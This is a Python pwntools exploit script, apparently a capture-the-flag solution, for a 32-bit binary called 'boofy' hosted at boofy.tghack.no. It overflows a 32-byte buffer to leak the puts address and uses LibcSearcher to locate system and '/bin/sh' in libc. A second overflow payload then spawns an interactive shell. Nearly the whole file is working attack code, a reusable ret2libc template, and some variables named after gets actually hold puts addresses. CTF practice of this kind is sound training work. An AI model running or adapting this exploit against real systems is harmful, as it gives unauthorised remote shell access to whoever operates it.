#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "boofy"
libFile  = ""

remoteIp = "boofy.tghack.no"
remotePort = 6003

LOCAL = 1
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	ru("Please enter the password?")
	_start = 0x08048370
	puts_plt = exe.plt['puts']
	gets_got = exe.got['puts']
	p = 'A' * 0x20 + p32(0x0) + p32(puts_plt) + p32(_start)
	p += p32(gets_got)
	sl(p)
	rl()
	rl()
	gets_addr = u32(r(24)[20:24])
	li('gets_addr' + hex(gets_addr))
	libc = LibcSearcher('puts', gets_addr)
	libc_base = gets_addr - libc.dump('puts')
	sys_addr =  libc_base + libc.dump('system')
	sh_addr =  libc_base  + libc.dump('str_bin_sh')

	p = 'A' * 0x20 + p32(0x0) + p32(sys_addr) + p32(_start)
	p += p32(sh_addr)
	sl(p)
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
    
